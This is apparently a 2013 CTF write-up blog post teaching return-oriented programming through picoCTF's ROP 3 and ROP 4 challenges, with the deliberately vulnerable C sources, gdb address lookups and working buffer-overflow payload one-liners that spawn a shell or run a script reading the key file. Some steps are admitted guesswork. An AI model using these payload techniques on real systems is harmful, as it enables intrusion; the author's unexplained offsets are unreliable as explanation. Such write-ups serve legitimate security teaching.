---
layout: post
title:  "ROP (Return Oriented Programming) - The Basics"
date:   2013-05-06
---

If you&nbsp;haven't&nbsp;read my blog post on [buffer overflows](http://www.zolmeister.com/2013/05/buffer-overflows-basics.html), I recommend you read it to better understand this post. This is based on the CTF competition [picoCTF](https://picoctf.com/), but should apply to most (basic) ROP problems.

What return oriented programming is all about:
ROP is related to buffer overflows, in that it requires a buffer to overflow. The difference is that ROP is used to bypass certain protection measures that prevent normal buffer overflows. It turns out that a lot of the time, memory in programs is marked as non-executable. This means that we can't just put shellcode on the stack and have it execute, this is where ROP comes in.
Recall the stack:

```
[ return address ] <-- this is the address of the next function to call, we want to overwrite this
[  eip (address) ] <-- this takes up memory
[ stack variable ] <-- this also takes up memory
[    buffer[15]  ] <-- this is the 16th character of our input string
[      ...       ]
[    buffer[0]   ] <-- our input starts here
```
Now, our goal (as in buffer overflows) is to take&nbsp;control&nbsp;of the stack. At this point, go watch this video:&nbsp;[http://codearcana.com/posts/2013/04/28/picoctf-videos.html](http://codearcana.com/posts/2013/04/28/picoctf-videos.html). It will explain the concept behind how we will need to modify the stack in order to get what we want, and I will show you the code.

Lets walk through ROP 3:

```c
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void vulnerable_function() {
  char buf[128];
  read(STDIN_FILENO, buf,256);
}
int main(int argc, char** argv) {
  vulnerable_function();
  write(STDOUT_FILENO, "Hello, World\n", 13);
}
```
Ok, so we have a 128 byte buffer. Remember that there is extra stuff above it in the stack, so we need to add some extra bytes to our overflow (12). Our exploit string looks like this:

```bash
cat <(python -c 'print "A"*140') - | ./rop3
```
Now lets add a return address. Specifically, lets add the address that points to the `<system>` call.

This is what we need to accomplish in C which will give us a shell: `system("/bin/sh");`

So we open up the program in gdb, and print out the adresss of system:

```
gdb rop3
     (gdb) break main
     (gdb) run
     (gdb) print system
     $1 = {<text variable, no debug info>} 0xf7e68250 <system>
```
Alright, system is at&nbsp;`0xf7e68250,` which in escaped [little endian](http://en.wikipedia.org/wiki/Endianness) looks like: `\x50\x82\xe6\xf7`.

Now our exploit string looks like this:

```bash
cat <(python -c 'print "\x00"*140+"\x50\x82\xe6\xf7") - | ./rop3
```

We need 2 more things, a fake return&nbsp;address&nbsp;and an&nbsp;argument&nbsp;to pass to `system ("/bin/sh")`.

The fake return address can be anything, so I chose `"\x00"*4` (remember an address is 4 bytes).

To get the `"/bin/sh"` string to pass in, were going to have find it inside of libc (unlike ROP 2, where it was given to you). This is done using gdb find, like so:

```
     (gdb) break main
     (gdb) run
     (gdb) print &system
     $1 = (<text variable, no debug info> *) 0xf7e68250 <system>
     (gdb) find &system,+9999999,"/bin/sh"
     0xf7f86c4c
     warning: Unable to access target memory at 0xf7fd0fd4, halting search.
     1 pattern found.
```
Now we have the string `"/bin/sh"` at&nbsp;`0xf7f86c4c`. Lets finish constructing our exploit string:  
    `(overflow)`  `(<system>)`      `(fake return address)` `("/bin/sh" from libc)`

```
cat <(python -c 'print "\x00"*140+"\x50\x82\xe6\xf7"+    "\x00"*4        +"\x4c\x6c\xf8\xf7"') - | ./rop3
```
Done!

```
    id
     uid=1796(user1792) gid=3009(rop3) groups=1797(user1792),1002(webshell)
```
Now for ROP 4 (by writing this, I was able to then go back and solve it).

Here is my solution:  
`(overflow)` `(<execlp>)`     `(fake return)` `("/bin/sh")(twice)` `($EXPLOIT env variable)`    `(null)`  

```
cat <(python -c 'print "A"*140+"\xb0\x3a\x05\x08"+   "A"*4  +"\x4f\xbf\x0c\x08"*2+"\x50\xd8\xff\xff"+"\xa1\x97\x0c\x08"') - | ./rop4
```
And the problem source:

```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
char exec_string[20];
void exec_the_string() {
    execlp(exec_string, exec_string, NULL);
}
void call_me_with_cafebabe(int cafebabe) {
    if (cafebabe == 0xcafebabe) {
        strcpy(exec_string, "/sh");
    }
}
void call_me_with_two_args(int deadbeef, int cafebabe) {
    if (cafebabe == 0xcafebabe && deadbeef == 0xdeadbeef) {
        strcpy(exec_string, "/bin");
    }
}
void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}
int main(int argc, char** argv) {
    exec_string[0] = '\0';

    vulnerable_function();
}
```

So, probably not how you were suppose to solve it (based on the source code), but it works. With ROP4, were not given `<system>`, but we are given `<execlp>`. execlp takes 3 parameters: `char *file, char *arg, NULL`

Our goal then is to run this (not really though, as you will learn later): `execlp("/bin/sh","/bin/sh",NULL); `

Lets get the addresses of `<exclp>`, `"/bin/sh"`, `"sh"`, and `NULL` using gdb:

```
     (gdb) break main
     (gdb) run
     (gdb) print execlp
     $1 = {<text variable, no debug info>} 0x8053ab0 <execlp>
     (gdb) find &execlp,+999999999,"/bin/sh"
     0x80cbf4f
     (gdb) print &null
     $3 = (<data variable, no debug info> *) 0x80c97a1
     (gdb) x/s 0x80c97a1
     0x80c97a1 <null>:      "(null)"
```

Alright, lets try it:  

`(overflow)`    `(execlp)`     `(fake return)` `("/bin/sh")(three times)`    `(null)`  

```
cat <(python -c 'print "A"*140+"\xb0\x3a\x05\x08"+   "A"*4+   "\x4f\xbf\x0c\x08"*3+   "\xa1\x97\x0c\x08"') - | ./rop4
```
*note, I don't know why I needed /bin/sh 3 times, but it works so just roll with it.

However, when we do that, we get: `/bin/sh: /bin/sh: cannot execute binary file`

Now, here is where I will admit that I don't actually know C (ie. how your suppose to call execlp). What I do know is that it's calling sh, with the parameter sh, which you can't do (sh sh: error). So instead of trying to fix that, I decided to change the argument passed to sh to be my own program (in my home directory). It looks like this:

```
# rop4s.sh
cat /problems/ROP_4_887f7f28b1f64d7e/key
```
Now, we need to be able to pass in the location of that file ("/home2/user1792/rop4s.sh") to our execlp function. Here is where we need to use an environment variable. Lets assign our string to EXPLOIT and then use our program from buffer overflows to find its address (compile with '-m32' to get a shoter memory address - gcc -m32 -o printer printer.c):

```bash
export EXPLOIT="/home2/user1792/rop4s.sh"
```

```c
/* printer.c */
     #include <stdio.h>
     #include <stdlib.h>
     int main(int argc, char **argv) {
      printf("\n%p\n\n", getenv("EXPLOIT"));
      return(0);
     }
```

Running that we get:&nbsp;0xffffd830 as our address. Alright, lets use that instead of our 3rd "/bin/sh":  
`(overflow)`    `(execlp)`      `(fake return)` `("/bin/sh")(two times)` `(EXPLOIT address)`     `(null)`

```
     cat <(python -c 'print "A"*140+"\xb0\x3a\x05\x08"+    "A"*4+   "\x4f\xbf\x0c\x08"*2+  "\x30\xd8\xff\xff"+"\xa1\x97\x0c\x08"') - | ./rop4
     /bin/sh: �z X�K ����i686: No such file or directory
```
Well that didn't work. Lets increase the address of our environment variable by an arbitrary 32 (0x20).  
`(overflow)` `(<execlp>)`     `(fake return)` `("/bin/sh")(twice)` `($EXPLOIT env variable)`    `(null)`

```
     cat <(python -c 'print "A"*140+"\xb0\x3a\x05\x08"+   "A"*4  +"\x4f\xbf\x0c\x08"*2+"\x50\xd8\xff\xff"+"\xa1\x97\x0c\x08"') - | ./rop4
```

Success! Wait... what just happened. <del>Yeah, I have no idea. Good luck!</del>
(I got the 0x20 increase by just increasing the value arbitrarily to something like 0x18, and found my environment variable stuck in there. Just increased the address until it cut off the "EXPLOIT=" bit before the path).

Normally [ASLR](http://en.wikipedia.org/wiki/Address_space_layout_randomization) is turned on, which randomizes addresses (like our environment variable) so that they're <del>impossible</del>&nbsp;hard to find. In this case ASLR was not turned on, but the stack got modified slightly anyways. Basically something caused the stack to change and move stuff around (ie. the real address to our environment variable), which we cannot always predict. That being said, we can still guess (as long as ASLR is off) and it turns out that we&nbsp;weren't&nbsp;that far off (0x20). Bypassing ASLR is outside the scope of this post (and my knowledge) but its nice to clear up that bit.

#### Update:
Finding the environment variable with a mangled stack can be tough, so I figured out a more robust solution. Instead of using an environment variable, lets just make a new command and use strings from libc to call it. This is what I mean:

1\. remember rop4s.sh?, make a copy of it and name it "ch"
2\. now edit your [PATH](http://www.cyberciti.biz/faq/howto-print-path-variable/)&nbsp;and add the directory of your "ch" shell script file
3\. now you can call "ch" from the command line, and it should run your script

Now lets see how the code looks:

```
     # first we need a string from libc that isn't already a command (I chose "ch")
     gdb rop4
     (gdb) break main
     (gdb) run
     (gdb) print execlp
     >> $1 = {<text variable, no debug info>} 0x8053ab0 <execlp>
     (gdb) find &execlp,+9999999,"ch"
     >> 0x80ccf48 <__PRETTY_FUNCTION__.8742+9>
     >> 0x80dafa1 #well, use this address
     # now we isolate rop4s.sh and rename it to "ch"
     mkdir cmd
     cp rop4s.sh cmd/ch
     # and then add it to our path
     export PATH=/home2/user1792/cmd:$PATH
     # and our new exploit becomes:
```

`(fill)`  `(execlp)`          `(retn)` `("/bin/sh")(twice)`      `("ch")`              `(null)`  

```
     cat <(python -c 'print "A"*140+"\xb0\x3a\x05\x08"+"A"*4+"\x4f\xbf\x0c\x08"*2+ "\xa1\xaf\x0d\x08"+"\xa1\x97\x0c\x08"') - | ./rop4
```
For more info on ROP's (and bypassing ASLR) check out these sources:  
[https://isisblogs.poly.edu/2011/10/21/geras-insecure-programming-warming-up-stack-1-rop-nxaslr-bypass/](https://isisblogs.poly.edu/2011/10/21/geras-insecure-programming-warming-up-stack-1-rop-nxaslr-bypass/)  
[http://blog.the-playground.dk/2012/08/lesson-learned-from-my-first-rop-exploit.html](http://blog.the-playground.dk/2012/08/lesson-learned-from-my-first-rop-exploit.html)  
[http://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx](http://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx)  
[http://security.dico.unimi.it/~gianz/pubs/acsac09.pdf](http://security.dico.unimi.it/~gianz/pubs/acsac09.pdf)  
